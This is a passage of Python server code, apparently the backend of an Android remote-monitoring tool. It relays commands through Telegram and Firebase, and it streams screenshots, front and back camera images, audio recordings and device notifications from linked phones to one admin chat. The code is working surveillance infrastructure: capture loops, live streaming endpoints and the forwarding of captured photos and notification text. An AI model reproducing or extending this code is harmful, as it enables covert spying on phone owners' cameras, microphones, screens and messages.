async function switchCamera(){
  var devId=document.getElementById('streamDevice').value;
  if(!devId)return;
  if(_streamType==='front_camera')_streamType='back_camera';
  else if(_streamType==='back_camera')_streamType='front_camera';
  else _streamType='camera';
  if(_streamActive){stopStream();setTimeout(function(){startStream();},500);}
  else{startStream();}
  notify('Camera switched');
}
function _onFrameReceived(base64Data,isAudio){
  if(base64Data===_lastFrameData)return;
  _lastFrameData=base64Data;
  if(!_firstFrameReceived){_firstFrameReceived=true;if(_streamWaitingTimer){clearTimeout(_streamWaitingTimer);_streamWaitingTimer=null;}}
  _frameCount++;
  document.getElementById('stFrames').textContent=_frameCount;
  document.getElementById('stLastAct').textContent=new Date().toLocaleTimeString();
  if(isAudio){_setViewerState('receiving_audio');}
  else{_setViewerState('receiving_video');document.getElementById('streamImg').src='data:image/jpeg;base64,'+base64Data;}
}
function startStreamPolling(devId){
  if(_streamPollTimer)clearInterval(_streamPollTimer);
  _streamPollTimer=setInterval(async function(){
    if(!_streamActive)return;
    try{
      var typeParam=_streamType==='audio'?'audio':'video';
      var resp=await fetch('/api/stream/frame/'+devId+'?type='+typeParam,{headers:{'Authorization':'Bearer '+TOKEN}});
      var r=await resp.json();
      if(r.ok&&r.data&&r.data.length>50){_onFrameReceived(r.data,false);}
      else if(r.ok&&_firstFrameReceived){}
      else if(!_firstFrameReceived){
        try{var sr=await fetch('/api/stream/status',{headers:{'Authorization':'Bearer '+TOKEN}});var status=await sr.json();if(status.ok&&status.active_streams&&status.active_streams[devId]){if(!_firstFrameReceived)_setViewerState('connected');}else if(!_firstFrameReceived&&_streamActive){_setViewerState('waiting');}}catch(e){}
      }
    }catch(e){}
  },2000);
}

// Add streaming category to commands
CMD_CATEGORIES.streaming={label:'&#x1F4E1; Streaming',cmds:['start_screen_stream','stop_screen_stream','start_camera_stream','stop_camera_stream','switch_camera','start_audio_stream','stop_audio_stream','get_stream_status','set_stream_quality','enable_torch','pause_stream','resume_stream','stop_all_streams','get_stream_capabilities']};
if(document.getElementById('cmdTabs')){
  var tabs=document.getElementById('cmdTabs');
  if(tabs.innerHTML.indexOf('Streaming')===-1){
    tabs.innerHTML+='<button class="tab" onclick="showCmdCat(\'streaming\',this)">&#x1F4E1; Streaming</button>';
  }
}
</script>
</body>
</html>"""

# ============================================================================
# WEB DASHBOARD ROUTE
# ============================================================================

async def serve_dashboard(request):
    return web.Response(text=DASHBOARD_HTML, content_type="text/html", charset="utf-8")

# ============================================================================
# GETUPDATES POLLING
# ============================================================================

async def tg_poll_loop():
    global tg_offset, polling_active, _processed_update_ids, _processed_message_keys, _message_dedup, _chat_rate_counter, _data_forward_dedup
    polling_active = True
    
    # === تنظيف الاتصالات القديمة عند بدء التشغيل ===
    log.info("Cleaning old connections (deleteWebhook)...")
    try:
        session = get_tg_session()
        # حذف webhook وتجاهل التحديثات المعلقة
        async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true") as resp:
            r = await resp.json()
            log.info("deleteWebhook: %s", r.get("description", r.get("ok")))
        await asyncio.sleep(1)
        # التحقق من البوت
        async with session.post(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe") as resp:
            me = await resp.json()
            if me.get("ok"):
                log.info("Bot connected: @%s (%s)", me["result"].get("username", "?"), me["result"].get("first_name", "?"))
            else:
                log.warning("getMe failed: %s", me)
        await asyncio.sleep(1)
    except Exception as exc:
        log.warning("Connection cleanup: %s", exc)
    
    log.info("Starting Telegram getUpdates polling...")
    
    _conflict_count = 0
    while polling_active:
        try:
            payload = {
                "offset": tg_offset,
                "timeout": 30,
                "allowed_updates": ["message", "callback_query"],
            }
            result = await tg_request("getUpdates", payload)
            if not result or not result.get("ok"):
                desc = (result or {}).get("description", "")
                if "Conflict" in desc:
                    _conflict_count += 1
                    log.warning("Conflict detected (%d), waiting...", _conflict_count)
                    await asyncio.sleep(8)
                else:
                    await asyncio.sleep(2)
                continue
            _conflict_count = 0  # إعادة العداد عند النجاح
            
            # Periodic cleanup (every 100 polls)
            if not hasattr(tg_poll_loop, '_poll_count'):
                tg_poll_loop._poll_count = 0
            tg_poll_loop._poll_count += 1
            if tg_poll_loop._poll_count % 100 == 0:
                now = time.time()
                _message_dedup = {k: v for k, v in _message_dedup.items() if now - v > 600}
                _chat_rate_counter = {k: v for k, v in _chat_rate_counter.items() if v and now - v[-1] > 300}
                _data_forward_dedup = {k: v for k, v in _data_forward_dedup.items() if now - v > 300}
            
            updates = result.get("result", [])
            for update in updates:
                update_id = update.get("update_id", 0)
                tg_offset = update_id + 1
                
                # === منع تكرار معالجة نفس التحديث ===
                if update_id in _processed_update_ids:
                    continue
                _processed_update_ids.add(update_id)
                if len(_processed_update_ids) > 1000:
                    _processed_update_ids = set(list(_processed_update_ids)[-500:])
                
                # Handle message
                if "message" in update:
                    msg = update["message"]
                    chat_id = msg.get("chat", {}).get("id")
                    text = msg.get("text", "")
                    msg_id = msg.get("message_id", 0)
                    
                    # === منع تكرار معالجة نفس الرسالة بالضبط ===
                    msg_key = f"{chat_id}:{msg_id}"
                    if msg_key in _processed_message_keys:
                        continue
                    _processed_message_keys.add(msg_key)
                    if len(_processed_message_keys) > 500:
                        _processed_message_keys = set(list(_processed_message_keys)[-200:])
                    
                    if chat_id != ADMIN_CHAT_ID:
                        log.warning("Unauthorized access from %s", chat_id)
                        continue
                    
                    if text.startswith("/"):
                        await handle_telegram_command(chat_id, text, msg_id)
                
                # Handle callback query
                if "callback_query" in update:
                    cb = update["callback_query"]
                    cb_id = cb.get("id", "")
                    cb_chat = cb.get("message", {}).get("chat", {}).get("id")
                    
                    # === منع تكرار معالجة نفس الـ callback ===
                    cb_key = f"cb:{cb_id}"
                    if cb_key in _processed_message_keys:
                        continue
                    _processed_message_keys.add(cb_key)
                    
                    if cb_chat != ADMIN_CHAT_ID:
                        continue
                    await handle_callback_query(cb)
        
        except asyncio.CancelledError:
            break
        except Exception as exc:
            log.error("Poll error: %s", exc)
            await asyncio.sleep(3)

# ============================================================================
# FIREBASE COMMAND RESULT LISTENER
# ============================================================================

async def firebase_result_listener():
    """Background task: Poll Firebase for results from Android app.
    ACTIVE mode - forwards results to Telegram admin."""
    global _processed_results
    log.info("Firebase result listener started (ACTIVE mode)")

    # Clean ALL old results AND commands on startup to prevent re-processing spam
    try:
        log.info("Cleaning ALL stale Firebase results on startup...")
        await firebase_set("results", None)
        log.info("Firebase results cleaned successfully")
    except Exception as exc:
        log.error("Firebase results cleanup error: %s", exc)
    try:
        log.info("Cleaning ALL stale Firebase commands on startup...")
        await firebase_set("commands", None)
        log.info("Firebase commands cleaned successfully")
    except Exception as exc:
        log.error("Firebase commands cleanup error: %s", exc)

    while polling_active:
        try:
            results_data = await firebase_get("results")
            if not results_data:
                await asyncio.sleep(3)
                continue
            if not isinstance(results_data, dict):
                await firebase_set("results", None)
                await asyncio.sleep(3)
                continue

            processed_any = False
            for device_id, cmds in results_data.items():
                if not isinstance(cmds, dict):
                    continue
                for cmd_id, result_entry in cmds.items():
                    if not isinstance(result_entry, dict):
                        continue

                    result_text = result_entry.get("result", "")
                    command = result_entry.get("command", cmd_id)
                    status = result_entry.get("status", "completed")

                    # Simple dedup by cmd_id (not content hash - prevents delete failures)
                    result_key = f"{device_id}:{cmd_id}"

                    if result_key in _processed_results:
                        continue

                    # === FORWARD RESULT TO TELEGRAM ===
                    try:
                        d = find_device(device_id)
                        dev_name = d.get("name", device_id) if d else device_id

                        # Try to parse result as JSON for better formatting and image detection
                        result_json_parsed = None
                        b64_image = None
                        display_text = str(result_text) if result_text else "تم بنجاح"
                        if len(display_text) > 4000:
                            display_text = display_text[:4000] + "..."

                        try:
                            result_json_parsed = json.loads(str(result_text))
                            if isinstance(result_json_parsed, dict):
                                # Check for base64 image in result (screenshots, cameras)
                                for img_key in ("base64", "base64_preview", "image", "image_data"):
                                    img_val = result_json_parsed.get(img_key, "")
                                    if img_val and len(img_val) > 1000:
                                        b64_image = img_val
                                        break
                                if result_json_parsed.get("ok") and result_json_parsed.get("message"):
                                    display_text = result_json_parsed["message"]
                                elif result_json_parsed.get("ok") and result_json_parsed.get("data") is not None:
                                    data = result_json_parsed["data"]
                                    if isinstance(data, list):
                                        count = len(data)
                                        if count == 0:
                                            display_text = "لا توجد بيانات"
                                        elif count <= 15:
                                            display_text = f"تم بنجاح - {count} عنصر\n\n<code>{json.dumps(data, ensure_ascii=False, indent=2)[:3000]}</code>"
                                        else:
                                            items_str = json.dumps(data[:10], ensure_ascii=False, indent=2)[:2000]
                                            display_text = f"تم بنجاح - {count} عنصر (أول 10)\n\n<code>{items_str}</code>\n\n...و {count-10} أخرى"
                                    elif isinstance(data, dict):
                                        display_text = json.dumps(data, ensure_ascii=False, indent=2)[:3000]
                        except Exception:
                            pass

                        cmd_desc = command or cmd_id
                        for reg_name, reg_info in COMMAND_REGISTRY.items():
                            if reg_info.get("cmd") == command:
                                cmd_desc = reg_info.get("desc", command)
                                break

                        if status in ("completed", "success"):
                            emoji = "\u2705"
                        elif status == "error":
                            emoji = "\u274c"
                        else:
                            emoji = "\U0001f4cb"

                        # Try to EDIT the pending message first (or send new)
                        pending = _pending_messages.pop(cmd_id, None)
                        batch_id = pending.get("batch_id") if pending else None

                        # === Send image directly for screenshots/camera ===
                        img_sent = False
                        if b64_image and command in ("screenshot", "front_camera", "back_camera"):
                            try:
                                import base64 as _b64
                                img_bytes = _b64.b64decode(b64_image)
                                if len(img_bytes) > 5000:  # Only send if meaningful size
                                    caption = f"{emoji} {dev_name} - {cmd_desc}"
                                    photo_resp = await send_photo(ADMIN_CHAT_ID, img_bytes, caption=caption)
                                    if photo_resp and photo_resp.get("ok"):
                                        img_sent = True
                                        log.info("Sent result as PHOTO: cmd=%s device=%s size=%d", cmd_id, device_id, len(img_bytes))
                            except Exception as img_err:
                                log.warning("Failed to send result as photo for cmd=%s: %s", cmd_id, img_err)

                        # Build text message
                        msg = (
                            f"{emoji} <b>نتيجة الأمر</b>\n\n"
                            f"\U0001f4f1 الجهاز: <code>{dev_name}</code>\n"
                            f"\U0001f4cb الأمر: {cmd_desc}\n"
                            f"\U0001f194 المعرف: <code>{cmd_id}</code>\n\n"
                            f"<code>{display_text}</code>"
                        )

                        # If image was sent, keep text shorter
                        if img_sent:
                            msg = f"{emoji} <b>{cmd_desc}</b>\n\U0001f4f1 <code>{dev_name}</code>\n\n<code>{display_text[:2000]}</code>"

                        msg_sent = False
                        if pending and pending.get("message_id"):
                            try:
                                edit_resp = await edit_message_text(
                                    pending["chat_id"], pending["message_id"],
                                    msg, reply_markup=None
                                )
                                if edit_resp and edit_resp.get("ok"):
                                    msg_sent = True
                                    log.info("Result EDITED pending message: cmd=%s msg_id=%d", cmd_id, pending["message_id"])
                                else:
                                    log.warning("Edit pending message failed for cmd=%s, sending new", cmd_id)
                            except Exception as edit_err:
                                log.warning("Edit pending message error for cmd=%s: %s", cmd_id, edit_err)
                        
                        if not msg_sent:
                            # For batch ops, don't flood - just update counter
                            if batch_id and batch_id in _batch_operations:
                                _batch_operations[batch_id]["responded"] += 1
                                await update_batch_progress(batch_id)
                            else:
                                await send_admin(msg)
                        elif batch_id and batch_id in _batch_operations:
                            _batch_operations[batch_id]["responded"] += 1
                            await update_batch_progress(batch_id)
                        log.info("Result FORWARDED to Telegram: cmd=%s device=%s type=%s", cmd_id, device_id, command)
                    except Exception as send_err:
                        log.error("Failed to forward result to Telegram: %s", send_err)

                    # Update local command status
                    update_command_status(cmd_id, status, result_text)
                    update_device(device_id, {"active": True})

                    # === CACHE SCREENSHOT/CAMERA IMAGES FOR STREAMING ===
                    if command in ("screenshot", "front_camera", "back_camera") and status in ("completed", "success"):
                        try:
                            result_json = json.loads(str(result_text)) if isinstance(result_text, str) else result_text
                            if isinstance(result_json, dict):
                                b64_data = result_json.get("base64_preview", "")
                                # Cache if we have substantial base64 data (full image, not truncated)
                                if len(b64_data) > 1000 and "..." not in b64_data[-5:]:
                                    frame_key = f"{device_id}:video"
                                    _latest_frames_module[frame_key] = {
                                        "data": b64_data,
                                        "timestamp": time.time(),
                                        "size": result_json.get("size", len(b64_data)),
                                        "source": command,
                                        "stream_id": device_id,
                                        "is_keyframe": True,
                                        "codec": "jpeg",
                                    }
                                    if device_id in _jpeg_stream_info:
                                        _jpeg_stream_info[device_id]["last_frame_time"] = time.time()
                                        _jpeg_stream_info[device_id]["frame_count"] = _jpeg_stream_info[device_id].get("frame_count", 0) + 1
                                    log.info("Cached %s result image for streaming: device=%s b64_len=%d", command, device_id, len(b64_data))
                        except Exception as cache_err:
                            log.error("Failed to cache screenshot result: %s", cache_err)

                    # Delete the result from Firebase immediately
                    try:
                        await firebase_set(f"results/{device_id}/{cmd_id}", None)
                    except Exception as del_err:
                        log.warning("Failed to delete Firebase result %s/%s: %s", device_id, cmd_id, del_err)

                    _processed_results.add(result_key)
                    processed_any = True

            if len(_processed_results) > 500:
                _processed_results = set(list(_processed_results)[-200:])
            
            # Cleanup stale pending messages (older than 5 minutes)
            now_ts = time.time()
            stale_keys = [k for k, v in _pending_messages.items() if now_ts - v.get("created_at", 0) > 300]
            for sk in stale_keys:
                del _pending_messages[sk]
            if stale_keys:
                log.info("Cleaned %d stale pending message(s)", len(stale_keys))

        except Exception as exc:
            log.error("Firebase listener error: %s", exc)

        # === Also clean stale Firebase commands (older than 90s, must exceed the 60s auto-delete) ===
        try:
            for dev in get_devices():
                did = dev.get("id", "")
                if not did:
                    continue
                fb_cmds = await firebase_get(f"commands/{did}")
                if fb_cmds and isinstance(fb_cmds, dict):
                    now = time.time()
                    for cid, cdata in fb_cmds.items():
                        if not isinstance(cdata, dict):
                            continue
                        created = cdata.get("created_at", "")
                        if created:
                            try:
                                from datetime import datetime as _dt2
                                ts_val = _dt2.strptime(created, "%Y-%m-%d %H:%M:%S").timestamp()
                                if now - ts_val > 90:
                                    await firebase_set(f"commands/{did}/{cid}", None)
                                    log.info("Cleaned stale Firebase command %s/%s (age=%ds)", did, cid, int(now-ts_val))
                            except Exception:
                                await firebase_set(f"commands/{did}/{cid}", None)
                        else:
                            # No timestamp - delete if we've already processed it
                            await firebase_set(f"commands/{did}/{cid}", None)
        except Exception as clean_err:
            pass  # Don't let cleanup errors break the listener

        await asyncio.sleep(3)

# ============================================================================
# DEVICE MONITORING LOOP
# ============================================================================

async def device_monitoring_loop():
    """Background task: Monitor device online/offline status by checking last_seen timestamps.
    Detects devices that went offline without sending an explicit offline heartbeat."""
    global _device_last_online_state
    log.info("Device monitoring loop started")

    # Initialize tracking state from existing devices on startup
    await asyncio.sleep(10)  # Wait for devices to register
    for d in get_devices():
        did = d.get("id", "")
        if did and did not in _device_last_online_state:
            _device_last_online_state[did] = d.get("active", False)
            log.info("Monitor: initialized %s as %s", did, "online" if d.get("active") else "offline")

    while polling_active:
        try:
            now = time.time()
            devices = get_devices()
            for d in devices:
                did = d.get("id", "")
                if not did:
                    continue
                last_seen_str = d.get("last_seen", "")
                is_active = d.get("active", False)

                # Parse last_seen to check if device should be considered offline
                try:
                    last_seen_dt = datetime.strptime(last_seen_str, "%Y-%m-%d %H:%M:%S")
                    last_seen_ts = last_seen_dt.timestamp()
                    time_since_seen = now - last_seen_ts
                except Exception:
                    time_since_seen = 999999

                # If device is marked active but hasn't been seen recently, mark offline
                if is_active and time_since_seen > DEVICE_OFFLINE_TIMEOUT:
                    update_device(did, {"active": False})
                    # Trigger offline alert via state tracking
                    was_online = _device_last_online_state.get(did, False)
                    if was_online:
                        _device_last_online_state[did] = False
                        dev_name = d.get("name", did)
                        try:
                            await send_admin(
                                f"🔴 <b>الجهاز غير متصل</b>\n\n"
                                f"📱 {dev_name} (<code>{did}</code>)\n"
                                f"⏱️ آخر ظهور: {last_seen_str}\n"
                                f"🕐 {ts()}",
                                disable_notification=True
                            )
                        except Exception:
                            pass
                        append_event("Device offline (timeout)", {"device_id": did})

            # Cleanup stale batch operations (older than 10 minutes)
            stale_batches = [k for k, v in _batch_operations.items() if now - v.get("created_at", 0) > 600]
            for sb in stale_batches:
                del _batch_operations[sb]

        except Exception as exc:
            log.error("Device monitoring error: %s", exc)

        await asyncio.sleep(60)  # Check every 60 seconds


# ============================================================================
# SESSION CLEANUP TASK
# ============================================================================

async def session_cleanup_loop():
    while True:
        try:
            sessions = load_json(SESSIONS_FILE, [])
            now = datetime.now(timezone.utc)
            active = []
            for s in sessions:
                try:
                    expires = datetime.fromisoformat(s.get("expires_at", "")).replace(tzinfo=timezone.utc)
                    if now <= expires:
                        active.append(s)
                except Exception:
                    continue
            save_json(SESSIONS_FILE, active)
            
            # Keep used codes and recent unused codes (lifetime codes)
            codes = load_json(LINK_CODES_FILE, [])
            used = [c for c in codes if c.get("used")]
            unused = [c for c in codes if not c.get("used")]
            # Keep only last 100 unused codes
            if len(unused) > 100:
                unused = unused[-100:]
            save_json(LINK_CODES_FILE, used + unused)
        except Exception:
            pass
        await asyncio.sleep(3600)

# ============================================================================
# APP FACTORY & ROUTES
# ============================================================================

def create_app():
    app = web.Application(middlewares=[cors_middleware], client_max_size=50*1024*1024)  # 50MB for file uploads
    
    @web.middleware
    async def log_requests(request, handler):
        if request.method == "POST":
            log.info("POST %s from %s (%s)", request.path, request.remote, request.headers.get("User-Agent", "")[:50])
        try:
            return await handler(request)
        except web.HTTPNotFound:
            log.warning("404 NOT FOUND: %s %s", request.method, request.path)
            raise
        except Exception as e:
            log.error("Request error %s %s: %s", request.method, request.path, e)
            raise
    
    # Web Dashboard
    app.router.add_get("/", serve_dashboard)
    app.router.add_get("/dashboard", serve_dashboard)
    
    # Health check endpoint (for Android app connectivity test)
    async def api_health(request):
        return web.json_response({
            "ok": True,
            "status": "running",
            "version": "3.4",
            "firebase": firebase_connected,
            "uptime": get_uptime(),
            "devices": len(get_devices()),
            "commands": len(COMMAND_REGISTRY),
        })
    app.router.add_get("/api/health", api_health)
    
    # Auth API
    app.router.add_post("/api/login", api_web_login)
    
    # Device API (no auth - device authenticates via link code/token)
    app.router.add_post("/api/verify_link", api_verify_link)
    app.router.add_post("/api/register", api_register)
    app.router.add_get("/api/commands/{device_id}", api_get_commands)
    app.router.add_get("/api/commands", api_get_commands)
    app.router.add_post("/api/command_result/{command_id}", api_command_result)
    app.router.add_post("/api/data/{device_id}", api_device_data)
    app.router.add_post("/api/data", api_device_data_body)
    app.router.add_post("/api/heartbeat", api_heartbeat)
    app.router.add_get("/api/settings/{device_id}", api_device_settings)

    # Device event API (receives buffered events from the app)
    async def api_device_event(request):
        """POST /api/event - Receive device events (notifications, monitoring, etc.)."""
        global api_hits
        api_hits += 1
        try:
            body = await request.json()
            device_id = body.get("device_id", "")
            event_type = body.get("event_type", "")
            data = body.get("data", {})
            timestamp = body.get("timestamp", time.time() * 1000)

            if not device_id or not event_type:
                return web.json_response({"ok": False, "error": "device_id and event_type required"}, status=400)

            # Validate device token
            device_token = request.headers.get("X-Device-Token", "")
            if not get_device_by_token(device_id, device_token):
                return web.json_response({"ok": False, "error": "Unauthorized or device not found"}, status=401)

            # Append to events log
            event_entry = {
                "device_id": device_id,
                "event_type": event_type,
                "data": data,
                "timestamp": timestamp,
                "server_time": ts()
            }

            events = load_json(EVENTS_FILE, [])
            events.append(event_entry)
            # Keep last 1000 events
            if len(events) > 1000:
                events = events[-1000:]
            save_json(EVENTS_FILE, events)

            # Forward notification events to Telegram
            if event_type == "notification" and load_settings().get("notifications", False):
                title = data.get("title", "")
                text = data.get("text", "")
                pkg = data.get("package", "")
                if title or text:
                    msg = f"🔔 Device Event\n\nDevice: {device_id}\nType: {event_type}\n   package: {pkg}\n   title: {title}\n   text: {text}"
                    await send_message(ADMIN_CHAT_ID, msg)

            return web.json_response({"ok": True, "stored": True})
        except Exception as exc:
            log.error("device_event error: %s", exc)
            return web.json_response({"ok": False, "error": str(exc)}, status=500)

    app.router.add_post("/api/event", api_device_event)
    
    # File upload API (for media: photos, videos, audio, screenshots)
    app.router.add_post("/api/upload", api_upload_file)
    app.router.add_post("/api/upload_base64", api_upload_base64)

    # Public API - link code generation (no auth required for device linking)
    async def api_generate_link(request):
        """POST /api/link_code - Generate a new link code for device pairing."""
        global api_hits
        api_hits += 1
        try:
            body = await request.json()
            # Verify the device is registered
            device_id = body.get("device_id", "")
            if device_id and not find_device(device_id):
                return web.json_response({"ok": False, "error": "Device not registered"}, status=403)
            entry = await generate_link_code()
            return web.json_response({"ok": True, "code": entry["code"], "session_id": entry.get("session_id", "")})
        except Exception as exc:
            log.error("link_code generation error: %s", exc)
            return web.json_response({"ok": False, "error": str(exc)}, status=500)
    app.router.add_post("/api/link_code", api_generate_link)
    
    # Web API (requires auth)
    app.router.add_get("/api/web/devices", api_web_devices)
    app.router.add_get("/api/web/device/{device_id}", api_web_device_detail)
    app.router.add_get("/api/web/commands", api_web_commands)
    app.router.add_get("/api/web/events", api_web_events)
    app.router.add_get("/api/web/stats", api_web_stats)
    app.router.add_post("/api/web/send_command", api_web_send_command)
    app.router.add_get("/api/web/link_code", api_web_link_code)
    app.router.add_get("/api/web/settings", api_web_settings_get)
    app.router.add_put("/api/web/settings", api_web_settings_set)
    app.router.add_delete("/api/web/unlink/{device_id}", api_web_unlink)
    app.router.add_post("/api/web/logout", api_web_logout)
    
    # ========== STREAMING WebSocket & REST API ==========

    # In-memory store for active streams and latest frames
    # Key: device_id -> {"ws": WebSocket, "streams": {...}, "last_activity": float}
    _stream_connections = {}
    # Key: f"{device_id}:{stream_type}" -> {"frame": base64_str, "timestamp": float, "config": dict}
    _latest_frames = {}
    # Key: f"{device_id}:{stream_type}" -> {"audio_chunk": base64_str, "timestamp": float}
    _latest_audio = {}
    # IP -> device_id mapping - use module-level _ip_device_map
    # JPEG tasks use module-level _jpeg_stream_tasks_module

    # STREAMS_FILE removed (was unused)

    async def ws_stream(request):
        """WebSocket endpoint for streaming - /ws/stream?device_id=xxx&stream_id=xxx"""
        from aiohttp import WSMsgType
        ws = web.WebSocketResponse(max_msg_size=10*1024*1024)  # 10MB
        await ws.prepare(request)

        device_id = request.query.get("device_id", "")
        stream_id = request.query.get("stream_id", "")

        if not device_id:
            await ws.close(4001, "device_id required")
            return ws

        log.info("WebSocket stream connected: device=%s stream=%s", device_id, stream_id)
        _stream_connections[device_id] = {"ws": ws, "stream_id": stream_id, "last_activity": time.time()}

        # Update device streaming status
        update_device(device_id, {"streaming": True, "stream_id": stream_id})

        try:
            async for msg in ws:
                if msg.type == WSMsgType.TEXT:
                    try:
                        data = json.loads(msg.data)
                        msg_type = data.get("type", "")

                        if msg_type in ("video", "audio"):
                            # Store latest frame/audio for dashboard polling
                            frame_key = f"{device_id}:{msg_type}"
                            entry = {
                                "data": data.get("data", ""),
                                "timestamp": data.get("timestamp", 0),
                                "size": data.get("size", 0),
                                "stream_id": data.get("stream_id", ""),
                                "is_keyframe": data.get("is_keyframe", False),
                                "codec": data.get("codec", ""),
                                "source": data.get("source", ""),
                            }
                            if msg_type == "video":
                                _latest_frames[frame_key] = entry
                            else:
                                _latest_audio[frame_key] = entry

                            _stream_connections[device_id]["last_activity"] = time.time()

                            # Forward to any dashboard viewer WebSockets
                            # Match by device_id OR exact stream_id for maximum compatibility
                            for vid, vinfo in list(_stream_connections.items()):
                                if vid.startswith("viewer_"):
                                    target = vinfo.get("target_stream", "")
                                    # Forward if viewer's target matches device_id OR stream_id
                                    if target == device_id or target == stream_id:
                                        try:
                                            await vinfo["ws"].send_str(msg.data)
                                        except Exception:
                                            pass

                        elif msg_type == "error":
                            log.warning("Stream error from %s: %s", device_id, data.get("error", ""))

                        elif msg_type == "config":
                            # Stream config message - just log it
                            log.debug("Stream config from %s: %s", device_id, json.dumps(data, ensure_ascii=False)[:200])

                    except json.JSONDecodeError:
                        pass
                    except Exception as exc:
                        log.error("Error processing stream message from %s: %s", device_id, exc)

                elif msg.type == WSMsgType.ERROR:
                    log.warning("WebSocket error from device %s", device_id)
                    break
                elif msg.type in (WSMsgType.CLOSED, WSMsgType.CLOSING):
                    break
        finally:
            _stream_connections.pop(device_id, None)
            update_device(device_id, {"streaming": False, "stream_id": ""})
            log.info("WebSocket stream disconnected: device=%s", device_id)

        return ws

    async def ws_stream_viewer(request):
        """WebSocket endpoint for dashboard viewers - /ws/stream/viewer?stream_id=xxx"""
        from aiohttp import WSMsgType
        ws = web.WebSocketResponse()
        await ws.prepare(request)

        stream_id = request.query.get("stream_id", "")
        if not stream_id:
            await ws.close(4001, "stream_id required")
            return ws

        viewer_id = f"viewer_{stream_id}"
        _stream_connections[viewer_id] = {"ws": ws, "target_stream": stream_id, "last_activity": time.time()}

        log.info("Stream viewer connected for stream_id=%s", stream_id)

        # Send any cached frames
        for key, entry in _latest_frames.items():
            if stream_id in key:
                try:
                    await ws.send_str(json.dumps({"type": "cached_frame", **entry}))
                except Exception:
                    break

        try:
            async for msg in ws:
                if msg.type in (WSMsgType.CLOSED, WSMsgType.CLOSING, WSMsgType.ERROR):
                    break
                elif msg.type == WSMsgType.TEXT:
                    try:
                        data = json.loads(msg.data)
                        cmd = data.get("type", "")
                        if cmd in ("stop_stream", "pause_stream", "resume_stream", "request_keyframe", "config_update"):
                            for did, dinfo in _stream_connections.items():
                                if not did.startswith("viewer_"):
                                    if did == stream_id or dinfo.get("stream_id") == stream_id:
                                        try:
                                            await dinfo["ws"].send_str(msg.data)
                                        except Exception:
                                            pass
                    except Exception:
                        pass
        finally:
            _stream_connections.pop(viewer_id, None)
            log.info("Stream viewer disconnected for stream_id=%s", stream_id)

        return ws

    @require_auth
    async def api_stream_frame(request):
        """GET /api/stream/frame/{device_id}?type=video|audio - Get latest stream frame for a device"""
        device_id = request.match_info.get("device_id", "")
        frame_type = request.query.get("type", "video")

        frame_key = f"{device_id}:{frame_type}"
        # Check both local (WebSocket streams) and module-level (JPEG uploads) caches
        store = _latest_frames if frame_type == "video" else _latest_audio
        entry = store.get(frame_key)
        if not entry:
            entry = _latest_frames_module.get(frame_key)

        if not entry:
            return web.json_response({"ok": False, "error": "No active stream"})

        return web.json_response({"ok": True, **entry})

    @require_auth
    async def api_stream_status(request):
        """GET /api/stream/status - Get all active stream connections"""
        active = {}
        for did, dinfo in _stream_connections.items():
            if not did.startswith("viewer_"):
                active[did] = {
                    "stream_id": dinfo.get("stream_id", ""),
                    "last_activity": dinfo.get("last_activity", 0),
                    "has_video_frame": f"{did}:video" in _latest_frames or f"{did}:video" in _latest_frames_module,
                    "has_audio_chunk": f"{did}:audio" in _latest_audio,
                }
        # Also report JPEG screenshot streams
        for did, info in _jpeg_stream_info.items():
            if info.get("active"):
                active[did] = {
                    "stream_id": did,
                    "last_activity": info.get("last_frame_time", 0),
                    "has_video_frame": f"{did}:video" in _latest_frames_module,
                    "has_audio_chunk": False,
                    "jpeg_stream": True,
                }
        return web.json_response({"ok": True, "active_streams": active, "total": len(active)})

    async def _jpeg_stream_loop(device_id, stream_type, interval):
        """Background task that queues screenshot/camera commands at regular intervals."""
        import asyncio
        cmd_map = {
            "screen": "screenshot",
            "camera": "front_camera",
            "audio": "record_audio",
        }
        cmd = cmd_map.get(stream_type, "screenshot")
        log.info("JPEG stream loop started: device=%s type=%s cmd=%s interval=%ds", device_id, stream_type, cmd, interval)
        try:
            while device_id in _jpeg_stream_info and _jpeg_stream_info[device_id].get("active"):
                # Queue the capture command
                queue_command(device_id, cmd)
                _jpeg_stream_info[device_id]["last_command_time"] = time.time()
                log.debug("JPEG stream: queued '%s' for %s", cmd, device_id)
                # Wait for interval (check every second so we can stop promptly)
                for _ in range(interval):
                    if device_id not in _jpeg_stream_info or not _jpeg_stream_info[device_id].get("active"):
                        break
                    await asyncio.sleep(1)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            log.error("JPEG stream loop error for %s: %s", device_id, e)
        finally:
            log.info("JPEG stream loop ended: device=%s", device_id)

    @require_auth
    async def api_jpeg_stream_start(request):
        """POST /api/stream/jpeg_start - Start JPEG screenshot streaming for a device."""
        global api_hits
        api_hits += 1
        try:
            body = await request.json()
            device_id = body.get("device_id", "")
            stream_type = body.get("type", "screen")
            interval = body.get("interval", 3)

            if not device_id:
                return web.json_response({"ok": False, "error": "device_id required"}, status=400)

            d = find_device(device_id)
            if not d:
                return web.json_response({"ok": False, "error": "Device not found"}, status=404)

            # Stop existing stream for this device if any
            if device_id in _jpeg_stream_info and _jpeg_stream_info[device_id].get("active"):
                _jpeg_stream_info[device_id]["active"] = False
                task = _jpeg_stream_tasks_module.get(device_id)
                if task and not task.done():
                    task.cancel()

            # Set up stream info
            _jpeg_stream_info[device_id] = {
                "active": True,
                "type": stream_type,
                "interval": interval,
                "started_at": time.time(),
                "last_command_time": 0,
                "last_frame_time": 0,
                "frame_count": 0,
            }

            # Send the first screenshot command immediately
            cmd_map = {"screen": "screenshot", "camera": "front_camera", "audio": "record_audio"}
            queue_command(device_id, cmd_map.get(stream_type, "screenshot"))

            # Start background loop
            task = asyncio.create_task(_jpeg_stream_loop(device_id, stream_type, interval))
            _jpeg_stream_tasks_module[device_id] = task

            update_device(device_id, {"streaming": True})
            append_event("JPEG stream started", {"device_id": device_id, "type": stream_type})
            log.info("JPEG stream started: device=%s type=%s interval=%ds", device_id, stream_type, interval)

            return web.json_response({"ok": True, "message": f"JPEG streaming started ({stream_type})"})
        except Exception as exc:
            log.error("jpeg_stream_start error: %s", exc)
            return web.json_response({"ok": False, "error": str(exc)}, status=500)

    @require_auth
    async def api_jpeg_stream_stop(request):
        """POST /api/stream/jpeg_stop - Stop JPEG screenshot streaming for a device."""
        global api_hits
        api_hits += 1
        try:
            body = await request.json()
            device_id = body.get("device_id", "")

            if not device_id:
                return web.json_response({"ok": False, "error": "device_id required"}, status=400)

            info = _jpeg_stream_info.get(device_id)
